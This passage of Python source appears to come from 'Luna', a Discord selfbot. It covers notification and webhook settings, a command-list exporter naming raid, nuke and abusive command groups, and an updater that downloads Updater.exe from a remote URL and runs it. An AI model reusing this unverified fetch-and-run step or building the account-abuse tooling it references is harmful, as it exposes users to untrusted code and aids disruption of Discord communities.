		await embed_builder(luna, description=f"```\nInstalled theme {theme} and applied it\nThis theme was made by {madeby}```")

bot.add_cog(CommunitythemesCog(bot))

class ToastCog(commands.Cog, name="Toast customization"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "toasticon",
					usage="<icon.ico>",
					description = "Customize the toast icon (has to be an .ico)")
	async def toasticon(self, luna, *, newicon:str):
		await luna.message.delete()
		if newicon.endswith(".ico"):
			printmessage(f"Changed toast icon to » {purple(f'{newicon}')}")
			config_toast_icon(f"{newicon}")
			await embed_builder(luna, description=f"```\nChanged toast icon to » {newicon}```")
		else:
			await error_builder(luna, description=f"```\nNot a valid icon file (.ico)```")
        
	@commands.command(name = "toasttitle",
					usage="<title>",
					description = "Customize the toast title")
	async def toasttitle(self, luna, *, newtitle:str):
		await luna.message.delete()
		printmessage(f"Changed toast title to » {purple(f'{newtitle}')}")
		if newtitle == "None":
			config_toast_title("")
		else:
			config_toast_title(f"{newtitle}")
		await embed_builder(luna, description=f"```\nChanged toast title to » {newtitle}```")

bot.add_cog(ToastCog(bot))

class ToastsCog(commands.Cog, name="Toast commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
	
	@commands.command(name = "toasts",
					usage="<on/off>",
					description = "Turn toasts on or off")
	async def toasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Toasts » {purple(f'{mode}')}")
			config_toast_toasts(mode)
			await embed_builder(luna, description=f"```\nToasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "logintoasts",
					usage="<on/off>",
					description = "Login toasts")
	async def logintoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Login toasts » {purple(f'{mode}')}")
			config_toast_login(mode)
			await embed_builder(luna, description=f"```\nLogin toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "nitrotoasts",
					usage="<on/off>",
					description = "Nitro toasts")
	async def nitrotoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Nitro sniper toasts » {purple(f'{mode}')}")
			config_toast_nitro(mode)
			await embed_builder(luna, description=f"```\nNitro sniper toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "giveawaytoasts",
					usage="<on/off>",
					description = "Giveaway toasts")
	async def giveawaytoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Giveaway toasts » {purple(f'{mode}')}")
			config_toast_giveaway(mode)
			await embed_builder(luna, description=f"```\nGiveaway toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "privnotetoasts",
					usage="<on/off>",
					description = "Privnote toasts")
	async def privnotetoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Privnote toasts » {purple(f'{mode}')}")
			config_toast_privnote(mode)
			await embed_builder(luna, description=f"```\nPrivnote toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "selfbottoasts",
					usage="<on/off>",
					description = "Selfbot toasts")
	async def selfbottoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Selfbot toasts » {purple(f'{mode}')}")
			config_toast_selfbot(mode)
			await embed_builder(luna, description=f"```\nSelfbot toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "pingtoasts",
					usage="<on/off>",
					description = "Ping toasts")
	async def pingtoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Pings toasts » {purple(f'{mode}')}")
			config_toast_pings(mode)
			await embed_builder(luna, description=f"```\nPings toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "ghostpingtoasts",
					usage="<on/off>",
					description = "Ghostping toasts")
	async def ghostpingtoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Ghostping toasts » {purple(f'{mode}')}")
			config_toast_ghostpings(mode)
			await embed_builder(luna, description=f"```\nGhostping toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "friendtoasts",
					usage="<on/off>",
					description = "Friend event toasts")
	async def friendtoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Friend event toasts » {purple(f'{mode}')}")
			config_toast_friendevents(mode)
			await embed_builder(luna, description=f"```\nFriend event toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "guildtoasts",
					usage="<on/off>",
					description = "Guild event toasts")
	async def guildtoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Guild event toasts » {purple(f'{mode}')}")
			config_toast_guildevents(mode)
			await embed_builder(luna, description=f"```\nGuild event toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "roletoasts",
					usage="<on/off>",
					description = "Role update toasts")
	async def roletoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Role update toasts » {purple(f'{mode}')}")
			config_toast_roleupdates(mode)
			await embed_builder(luna, description=f"```\nRole update toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "nicktoasts",
					usage="<on/off>",
					description = "Nickname update toasts")
	async def nicktoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Nickname update toasts » {purple(f'{mode}')}")
			config_toast_nickupdates(mode)
			await embed_builder(luna, description=f"```\nNickname update toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "protectiontoasts",
					usage="<on/off>",
					description = "Protection toasts")
	async def protectiontoasts(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Protection toasts » {purple(f'{mode}')}")
			config_toast_protections(mode)
			await embed_builder(luna, description=f"```\nProtection toasts » {mode}```")
		else:
			await mode_error(luna, "on or off")

bot.add_cog(ToastsCog(bot))

class WebhooksCog(commands.Cog, name="Webhook commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	# @commands.command(name = "webhooksetup",
	# 				usage="",
	# 				description = "Set up all webhooks")
	# async def webhooksetup(self, luna):
    #     try:
    #         category = await luna.guild.create_category_channel(name="Luna Webhooks")
    #         nitro = await category.create_text_channel("nitro")
    #         giveaways = await category.create_text_channel("giveaways")
    #         privnotes = await category.create_text_channel("privnotes")
    #         sbdetection = await category.create_text_channel("sb-detection")
    #         ghostpings = await category.create_text_channel("ghostpings")
    #         commands = await category.create_text_channel("command-usage")
    #         dmdels = await category.create_text_channel("dm-deletions")
    #         watcher = await category.create_text_channel("watcher")
    #         server_bans = await category.create_text_channel("bans")
    #         tickets = await category.create_text_channel("tickets")
    #         relationships = await category.create_text_channel("relationships")
    #         role_updates = await category.create_text_channel("role-updates")
    #         nick_updates = await category.create_text_channel("nick-updates")

            
    #         wnitro = await nitro.create_webhook(name="Nitro")
    #         wgiveaways = await giveaways.create_webhook(name="Giiveaways")
    #         wprivnotes = await privnotes.create_webhook(name="Privnotes")
    #         wsbdetection = await sbdetection.create_webhook(name="Selfbot Detection")
    #         wghostpings = await ghostpings.create_webhook(name="Ghostpings")
    #         wcommands = await commands.create_webhook(name="Command Usage")
    #         wdmdels = await dmdels.create_webhook(name="DM Deletions")
    #         wwatcher = await watcher.create_webhook(name="Watcher")
    #         wserver_bans = await server_bans.create_webhook(name="Server bans")
    #         wtickets = await tickets.create_webhook(name="Tickets")
    #         wrelationships = await relationships.create_webhook(name="Relationships")
    #         wrole_updates = await role_updates.create_webhook(name="Role Updates")
    #         wnick_updates = await nick_updates.create_webhook(name="Nickname Updates")
            
    #         with open("config.json", "r", encoding="utf-8") as jsonFile:
    #             data = json.load(jsonFile)
            
    #         data['nitro_webhook_url'] = wnitro.url
    #         data['giveaways_webhook_url'] = wgiveaways.url
    #         data['ghostping_detection_webhook'] = wghostpings.url
    #         data['privnote_webhook_url'] = wprivnotes.url
    #         data['command_usage_webhook'] = wcommands.url
    #         data['dm_delete_notify_webhook_url'] = wdmdels.url
    #         data['selfbot_detection_webhook'] = wsbdetection.url
    #         data['server_ban_webhook'] = wserver_bans.url
    #         data['ticket_webhook_url'] = wtickets.url
    #         data['watcher_webhook_url'] = wwatcher.url
    #         data['relationship_webhook_url'] = wrelationships.url
    #         data['role_update_webhook'] = wrole_updates.url
    #         data['nickname_update_webhook'] = wnick_updates.url
        
    #         with open("config.json", "w", encoding="utf-8") as jsonFile:
    #             json.dump(data, jsonFile, indent=4, sort_keys=False)
                
    #         embed = discord.Embed(title=f'Webhooks Setup', description="Your webhook channels have been set up and saved to your config.",timestamp=embed_timestamp())
    #         embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
    #         embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #         embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #         await embed_or_codeblock(ctx, embed)
    #     except Exception:
    #         pass

bot.add_cog(WebhooksCog(bot))

class WebhookCog(commands.Cog, name="Webhook customisation"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "wtitle",
					usage="<title>",
					description = "Customize the webhook title")
	async def wtitle(self, luna, *, newtitle:str):
		await luna.message.delete()
		printmessage(f"Changed webhook title to » {purple(f'{newtitle}')}")
		if newtitle == "None":
			config_webhook_title("")
		else:
			config_webhook_title(f"{newtitle}")
		await embed_builder(luna, description=f"```\nChanged webhook title to » {newtitle}```")

	@commands.command(name = "wfooter",
					usage="<footer>",
					description = "Customize the webhook footer")
	async def wfooter(self, luna, *, newfooter:str):
		await luna.message.delete()

		printmessage(f"Changed webhook footer to » {purple(f'{newfooter}')}")
		if newfooter == "None":
			config_webhook_footer("")
		else:
			config_webhook_footer(f"{newfooter}")
		await embed_builder(luna, description=f"```\nChanged webhook footer to » {newfooter}```")

	@commands.command(name = "wimage",
					usage="<url>",
					description = "Customize the thumbnail image")
	async def wimage(self, luna, newimageurl:str):
		await luna.message.delete()

		printmessage(f"Changed webhook thumbnail url to » {purple(f'{newimageurl}')}")
		if newimageurl == "None":
			config_webhook_image("")
		else:
			config_webhook_image(f"{newimageurl}")
		await embed_builder(luna, description=f"```\nChanged webhook thumbnail url to » {newimageurl}```")

	@commands.command(name = "whexcolor",
					usage="<#hex>",
					description = "Webhook hexadecimal color")
	async def whexcolor(self, luna, newhexcolor:str):
		await luna.message.delete()

		printmessage(f"Changed webhook color to » {purple(f'{newhexcolor}')}")
		if newhexcolor == "None":
			config_webhook_hexcolor("")
		else:
			config_webhook_hexcolor(f"{newhexcolor}")
		await embed_builder(luna, description=f"```\nChanged webhook color to » {newhexcolor}```")

	@commands.command(name = "wmatch",
					usage="",
					description = "Match webhook theme")
	async def wmatch(self, luna):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		themesvar = config.get('theme')
		with open(f"data/themes/{themesvar}") as f:
			theme = json.load(f)
		title = theme.get('title')
		footer = theme.get('footer')
		imageurl = theme.get('imageurl')
		hexcolor = theme.get('hexcolor')
		printmessage(f"Matched webhook to » {purple(f'{themesvar[:-5]}')}")
		config_webhook_title(f"{title}")
		config_webhook_footer(f"{footer}")
		config_webhook_image(f"{imageurl}")
		config_webhook_hexcolor(f"{hexcolor}")
		await embed_builder(luna, description=f"```\nMatched webhook to » {themesvar[:-5]}```")

bot.add_cog(WebhookCog(bot))

class MiscCog(commands.Cog, name="Miscellaneous commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "thelp",
					usage="",
					description = "All commands in a text file")
	async def thelp(self, luna):
		await luna.message.delete()

		#///////////////////////////////////////////////////////////////////

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		#///////////////////////////////////////////////////////////////////

		cog = self.bot.get_cog('Help commands')
		commands = cog.get_commands()
		helpcommands = ""
		for command in commands:
			helpcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Administrative commands')
		commands = cog.get_commands()
		admincommands = ""
		for command in commands:
			admincommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Animated commands')
		commands = cog.get_commands()
		animatedcommands = ""
		for command in commands:
			animatedcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Text commands')
		commands = cog.get_commands()
		textcommands = ""
		for command in commands:
			textcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
			
		cog = self.bot.get_cog('Image commands')
		commands = cog.get_commands()
		imagecommands = ""
		for command in commands:
			imagecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Troll commands')
		commands = cog.get_commands()
		trollcommands = ""
		for command in commands:
			trollcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Fun commands')
		commands = cog.get_commands()
		funcommands = ""
		for command in commands:
			funcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Tools commands')
		commands = cog.get_commands()
		toolscommands = ""
		for command in commands:
			toolscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Nettool commands')
		commands = cog.get_commands()
		nettoolscommands = ""
		for command in commands:
			nettoolscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Util commands')
		commands = cog.get_commands()
		utilscommands = ""
		for command in commands:
			utilscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Abusive commands')
		commands = cog.get_commands()
		abusecommands = ""
		for command in commands:
			abusecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Raid commands')
		commands = cog.get_commands()
		raidcommands = ""
		for command in commands:
			raidcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Nuking commands')
		commands = cog.get_commands()
		nukecommands = ""
		for command in commands:
			nukecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Protection commands')
		commands = cog.get_commands()
		protectioncommands = ""
		for command in commands:
			protectioncommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Miscellaneous commands')
		commands = cog.get_commands()
		misccommands = ""
		for command in commands:
			misccommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Settings commands')
		commands = cog.get_commands()
		settingscommands = ""
		for command in commands:
			settingscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Share commands')
		commands = cog.get_commands()
		sharecommands = ""
		for command in commands:
			sharecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
	
		cog = self.bot.get_cog('Toast customization')
		commands = cog.get_commands()
		toastcustomcommands = ""
		for command in commands:
			toastcustomcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Toast commands')
		commands = cog.get_commands()
		toastcommands = ""
		for command in commands:
			toastcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Customization commands')
		commands = cog.get_commands()
		customizationcommands = ""
		for command in commands:
			customizationcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Webhook customisation')
		commands = cog.get_commands()
		webhookcommands = ""
		for command in commands:
			webhookcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('NSFW commands')
		commands = cog.get_commands()
		nsfwcommands = ""
		for command in commands:
			nsfwcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Cryptocurrency commands')
		commands = cog.get_commands()
		cryptocommands = ""
		for command in commands:
			cryptocommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Encode commands')
		commands = cog.get_commands()
		encodecommands = ""
		for command in commands:
			encodecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Decode commands')
		commands = cog.get_commands()
		decodecommands = ""
		for command in commands:
			decodecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		#///////////////////////////////////////////////////////////////////

		commandcount = len(self.bot.commands)

		file = open("commands.txt", "w") 
		file.write(f"{commandcount} Commands\n\n<> is required | [] is optional\n\nCategories:\n{helpcommands}\nAdmin Commands:\n{admincommands}\nAnimated Commands:\n{animatedcommands}\nText Commands:\n{textcommands}\nImage Commands:\n{imagecommands}\nTroll Commands:\n{trollcommands}\nFun Commands:\n{funcommands}\nTools:\n{toolscommands}\nNetworking Tools\n{nettoolscommands}\nUtilities\n{utilscommands}\nAbusive Commands\n{abusecommands}\nRaiding\n{raidcommands}\nNuking\n{nukecommands}\nProtections\n{protectioncommands}\nMiscellaneous\n{misccommands}\nSettings\n{settingscommands}\nSharing\n{sharecommands}\nCustomization\n{customizationcommands}\nToast Settings\n{toastcommands}\nToast Customization\n{toastcustomcommands}\nWebhook Settings\n{webhookcommands}\nNSFW\n{nsfwcommands}\nCryptocurrency\n{cryptocommands}\nEncode\n{encodecommands}\nDecode\n{decodecommands}")
		file.close()
		await embed_builder(luna, title="Text Help", description=f"```\nSaved all commands in commands.txt```")

	@commands.command(name = "update",
					usage="",
					description = "Updates Luna")
	async def update(self, luna):
		await luna.message.delete()
		versionpastedec = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg')
		for line in versionpastedec:
			versionpaste = line.decode().strip()
		if f"'{lunaversion}'" == versionpaste:
			await embed_builder(luna, title="Update", description=f"```\nYou are on the latest version!```")
		else:
			await embed_builder(luna, title="Update", description=f"```\nStarted update » {versionpaste}```")
			clear()
			title(f"Luna | Update")
			print(purpleblue(logo))
			print(f"Status:    {bcolors.YELLOW}New version found{bcolors.RESET}")
			print(f"- A new version is available ({bcolors.MAGENTA}{versionpaste}{bcolors.RESET})")
			print()
			print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════")
			printevent("Preparing update, please wait...")
			r = requests.get(updateurl, stream=True)

			chunk_size = 1024
			total_size = int(r.headers['content-length'])
			from tqdm import tqdm
			with open('Updater.exe', 'wb') as f:
				for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=total_size / chunk_size,unit='KB'):
					f.write(data)

			print("Download finished.")
			time.sleep(0.05)
			print("Starting ..")
			os.startfile("Updater.exe")
			os._exit(0)

	@commands.command(name = "crypto",
					usage="",
					description = "Cryptocurrency")
	async def crypto(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		cog = self.bot.get_cog('Cryptocurrency commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Cryptocurrency", description=f"{descriptionvar()}```\n{helptext}```")

	@commands.command(name = "restart",
					usage="",
					aliases=['reboot'],
					description = "Restart Luna")
	async def restart(self, luna):
		await luna.message.delete()

		if mode() == 2:
			sent = await luna.send(f"```ini\n[ Restarting ]\n\nAllow up to 5 seconds\n\n[ {footervar()} ]```")
			await asyncio.sleep(3)
			await sent.delete()
		elif mode() == 3:
			sent = await luna.send(f"> **Restarting**\n> \n> Allow up to 5 seconds\n> \n> {footervar()}")
			await asyncio.sleep(3)
			await sent.delete()
		else:
			embed = discord.Embed(title="Restarting", url=titleurlvar(), description=f"```\nAllow up to 5 seconds```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			sent = await luna.send(embed=embed)
			await asyncio.sleep(3)
			await sent.delete()
		restart_program()

	@commands.command(name = "clear",
					aliases=['cls'],
					usage="",
					description = "Clear the console")
	async def clear(self, luna):
		await luna.message.delete()
		motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ')
		for line in motd:
			motd = line.decode().strip()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		clear()
		print(purpleblue(logo))
		print(f"                           {purple('[')}+{purple('] CONNECTED')}")
		print(f"                           {purple('[')}+{purple(']')} {bot.user} | {purple(f'{len(bot.guilds)}')} Servers | {purple(f'{len(bot.user.friends)}')} Friends")
		print(f"                           {purple('[')}+{purple(']')} {prefix}\n")
		print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
		commandcount = len(bot.commands)
		printmessage(f"{motd} {commandcount} commands.")

	@commands.command(name = "covid",
					aliases=['corona'],
					usage="",
					description = "Corona statistics")
	async def covid(self, luna):
		await luna.message.delete()
		request = requests.get(f'https://api.covid19api.com/summary')
		data = request.json()
		info = data['Global']
		totalconfirmed = info['TotalConfirmed']
		totalrecovered = info['TotalRecovered']
		totaldeaths = info['TotalDeaths']
		newconfirmed = info['NewConfirmed']
		newrecovered = info['NewRecovered']
		newdeaths = info['NewDeaths']
		date = info['Date']
		await embed_builder(luna, title="Covid-19 Statistics", description=f"```Total Confirmed Cases\n{totalconfirmed}``````Total Deaths\n{totaldeaths}``````Total Recovered\n{totalrecovered}``````New Confirmed Cases\n{newconfirmed}``````New Deaths\n{newdeaths}``````New Recovered\n{newrecovered}``````Date\n{date}```")

	@commands.command(name = "fnshop",
					usage="",
					description = "Current Fortnite shop")
	async def fnshop(self, luna):
		await luna.message.delete()
		await embed_builder(luna, title="Fortnite Shop", large_image="https://api.nitestats.com/v1/shop/image")

	@commands.command(name = "fnmap",
					usage="",
					description = "Current Fortnite map")
	async def fnmap(self, luna):
		await luna.message.delete()
		await embed_builder(luna, title="Fortnite Map", large_image="https://media.fortniteapi.io/images/map.png?showPOI=true")

	@commands.command(name = "fnnews",
					usage="",
					description = "Current Fortnite news")
	async def fnnews(self, luna):
		await luna.message.delete()
		fortnite = requests.get("https://fortnite-api.com/v2/news/br").json()
		await embed_builder(luna, title="Fortnite News", large_image=fortnite["data"]["image"])

bot.add_cog(MiscCog(bot))

# if __name__ == '__main__':
luna_authentication()